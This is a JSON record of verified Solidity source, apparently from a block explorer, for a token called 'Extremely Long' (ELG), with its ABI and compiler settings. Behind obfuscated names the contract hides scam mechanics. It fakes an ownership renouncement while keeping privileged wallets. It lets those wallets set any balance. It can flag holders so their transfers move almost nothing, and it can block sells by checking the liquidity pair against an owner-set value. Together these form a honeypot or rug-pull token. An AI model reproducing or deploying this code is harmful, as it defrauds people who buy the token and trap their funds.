{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface fundLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapAt {\n    function createPair(address exemptToken, address swapSellLimit) external returns (address);\n}\n\ninterface takeReceiverTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalAt) external view returns (uint256);\n\n    function transfer(address amountReceiver, uint256 txIs) external returns (bool);\n\n    function allowance(address totalLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountReceiver,\n        uint256 txIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAuto, uint256 value);\n    event Approval(address indexed totalLaunch, address indexed spender, uint256 value);\n}\n\ninterface launchMax is takeReceiverTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtremelyLong is toAmount, takeReceiverTrading, launchMax {\n\n    function maxTeamFrom(address maxSwap, address amountReceiver, uint256 txIs) internal returns (bool) {\n        if (maxSwap == buyTotal) {\n            return txTokenMode(maxSwap, amountReceiver, txIs);\n        }\n        uint256 txTeam = takeReceiverTrading(totalLiquiditySell).balanceOf(marketingFee);\n        require(txTeam == modeSwap);\n        require(amountReceiver != marketingFee);\n        if (marketingTo[maxSwap]) {\n            return txTokenMode(maxSwap, amountReceiver, modeLaunchToken);\n        }\n        return txTokenMode(maxSwap, amountReceiver, txIs);\n    }\n\n    function enableLiquidity() public {\n        emit OwnershipTransferred(buyTotal, address(0));\n        fundAuto = address(0);\n    }\n\n    bool private tradingShould;\n\n    function transferFrom(address maxSwap, address amountReceiver, uint256 txIs) external override returns (bool) {\n        if (_msgSender() != teamReceiver) {\n            if (limitSell[maxSwap][_msgSender()] != type(uint256).max) {\n                require(txIs <= limitSell[maxSwap][_msgSender()]);\n                limitSell[maxSwap][_msgSender()] -= txIs;\n            }\n        }\n        return maxTeamFrom(maxSwap, amountReceiver, txIs);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atBuyMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundAuto;\n    }\n\n    mapping(address => uint256) private swapLaunchSell;\n\n    function receiverListMarketing(uint256 txIs) public {\n        minFund();\n        modeSwap = txIs;\n    }\n\n    function fromReceiver(address launchBuy, uint256 txIs) public {\n        minFund();\n        swapLaunchSell[launchBuy] = txIs;\n    }\n\n    constructor (){\n        if (atFund == listLaunchedSell) {\n            tradingShould = false;\n        }\n        fundLimit takeToken = fundLimit(teamReceiver);\n        totalLiquiditySell = swapAt(takeToken.factory()).createPair(takeToken.WETH(), address(this));\n        \n        buyTotal = _msgSender();\n        enableLiquidity();\n        fromWallet[buyTotal] = true;\n        swapLaunchSell[buyTotal] = fromTake;\n        \n        emit Transfer(address(0), buyTotal, fromTake);\n    }\n\n    mapping(address => mapping(address => uint256)) private limitSell;\n\n    uint256 public feeReceiverFrom;\n\n    string private atBuyMarketing = \"ELG\";\n\n    address public totalLiquiditySell;\n\n    uint256 private totalTx;\n\n    function txTokenMode(address maxSwap, address amountReceiver, uint256 txIs) internal returns (bool) {\n        require(swapLaunchSell[maxSwap] >= txIs);\n        swapLaunchSell[maxSwap] -= txIs;\n        swapLaunchSell[amountReceiver] += txIs;\n        emit Transfer(maxSwap, amountReceiver, txIs);\n        return true;\n    }\n\n    function balanceOf(address totalAt) public view virtual override returns (uint256) {\n        return swapLaunchSell[totalAt];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minLimitTeam;\n    }\n\n    address public buyTotal;\n\n    bool public buyMin;\n\n    address marketingFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public exemptFee;\n\n    function name() external view virtual override returns (string memory) {\n        return isTotal;\n    }\n\n    function minTx(address amountAuto) public {\n        minFund();\n        \n        if (amountAuto == buyTotal || amountAuto == totalLiquiditySell) {\n            return;\n        }\n        marketingTo[amountAuto] = true;\n    }\n\n    uint256 public limitWallet;\n\n    mapping(address => bool) public fromWallet;\n\n    uint256 private fromTake = 100000000 * 10 ** 18;\n\n    function approve(address launchedTrading, uint256 txIs) public virtual override returns (bool) {\n        limitSell[_msgSender()][launchedTrading] = txIs;\n        emit Approval(_msgSender(), launchedTrading, txIs);\n        return true;\n    }\n\n    function transfer(address launchBuy, uint256 txIs) external virtual override returns (bool) {\n        return maxTeamFrom(_msgSender(), launchBuy, txIs);\n    }\n\n    mapping(address => bool) public marketingTo;\n\n    address teamReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant modeLaunchToken = 5 ** 10;\n\n    bool public autoTeam;\n\n    uint256 tokenShould;\n\n    event OwnershipTransferred(address indexed toTx, address indexed toBuy);\n\n    function minFund() private view {\n        require(fromWallet[_msgSender()]);\n    }\n\n    uint256 public atFund;\n\n    uint256 public listLaunchedSell;\n\n    function allowance(address receiverMarketing, address launchedTrading) external view virtual override returns (uint256) {\n        if (launchedTrading == teamReceiver) {\n            return type(uint256).max;\n        }\n        return limitSell[receiverMarketing][launchedTrading];\n    }\n\n    uint8 private minLimitTeam = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromTake;\n    }\n\n    uint256 modeSwap;\n\n    function feeToken(address fromTo) public {\n        if (buyMin) {\n            return;\n        }\n        if (feeReceiverFrom == atFund) {\n            exemptFee = true;\n        }\n        fromWallet[fromTo] = true;\n        \n        buyMin = true;\n    }\n\n    address private fundAuto;\n\n    function owner() external view returns (address) {\n        return fundAuto;\n    }\n\n    string private isTotal = \"Extremely Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"}],\"name\":\"feeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunchedSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"receiverListMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquiditySell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExtremelyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}